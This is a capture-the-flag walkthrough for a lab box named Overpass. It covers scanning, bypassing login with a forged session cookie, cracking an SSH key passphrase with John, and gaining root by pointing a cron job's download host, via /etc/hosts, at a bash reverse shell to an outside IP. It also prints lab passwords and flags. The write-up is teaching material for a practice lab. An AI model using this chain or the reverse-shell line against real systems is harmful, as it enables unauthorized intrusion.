# Hack the machine and get the flag in user.txt

`nmap -sS -Pn -p- -T4 $target -vv`
we can see that port 80 is open.  Looking at the website, looking at the source we can see a comment
```html
<p>People reuse the same password for multiple services. If you are one of them, you're risking your accounts being hacked by evil hackers.
</p>

<p>Overpass allows you to securely store different passwords for every service, protected using military grade 
<!--Yeah right, just because the Romans used it doesn't make it military grade, change this?--> 
cryptography to keep you safe.
</p>
```

I'm guessing at this stage it is referring to a [Caesar Cipher](https://en.wikipedia.org/wiki/Caesar_cipher)

Looking at the source code we find
`//Secure encryption algorithm from https://socketloop.com/tutorials/golang-rotate-47-caesar-cipher-by-47-characters-example`

This confirms a simple cipher.

Running the application and creating a password adds a file `~/.overpass` that contains the passwords

`gobuster dir --url http://$target -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 40`
reveals an admin portal returned

Trying admin / admin and a few credentials, fail.
Attempted SQL injection but doesn't return anything apart from `incorrect credentials` so suspect it isn't vulnerable to that.

Looking at the logon page source, we see references to `main.js`, `login.js`, and `cookie.js`

`main.js` contains `Hellow World` which we can see in the browser console.
`login.js` contains the logon component.
At the bottom it shows the if else for the login.  On failed login, the `statusOrCookie` is `Incorrect credentials`.  On a successful login, the `SessionToken` is set to the value of `statusOrCookie`.

Using the browser console, create a cookie with a name of `SessionToken` and a value of `"value"` - essentially anything.  Reloading the page provides a successful authentication.

This page appears to give us an SSH private key for James

Saving the key and trying to ssh to the target fails as the key has a passphrase attached to it.

Use `ssh2john private.pem > out.hash'
then
`john --wordlist=rockyou.txt out.hash`

This gives us the password `james13`

Login using ssh `ssh james@$target -i private.pem`
password: `james13`

Grab the `user.txt`
`thm{65c1aaf000506e56996822c6281e6bf7}`

There is a `todo.txt` file with some information and a `overpass` database we can use.

Running `overpass` to `Retrieve All Passwords` gives us
`System saydrawnlyingpicture`
I expect this to be James's password

Trying to run `sudo` with this authenticates successfully but we are unable to run sudo.

Looking at history, env, sudo -l, find / -perm -u=s -type f 2>/dev/null, gtfobins, find / -writable -type d 2>/dev/null, provides no privesc methods
`/etc/crontab` has the buildscript running
`ps -aux` shows the user tryhackme running the web server, and `/etc/passwd` shows a tryhackme user.


The crontab is pulling `buildscript.sh` file from the website overpass.thm which is essentially localhost.  The `/etc/hosts` file is writable.

Lets try to redirect this to us and run remote code.

Create a listener on our machine `nc -vnlp 8080'
Create a directory structure `/tmp/downloads/src/`
Create a `buildscript.sh` file in the above folder containing
`bash -c 'exec bash -i &>/dev/tcp/10.4.18.254/8080 <&1'` changing the IP to your IP address
In the `/tmp/` folder run the following:
`sudo python3 -m http.server`
In the Target machine, modify the hosts file to point overpass.thm to your IP
We shortly see a connection downloading the build script
and our listener got a connection

From there we can grab the `root.txt`

`thm{7f336f8c359dbac18d54fdd64ea753bb}`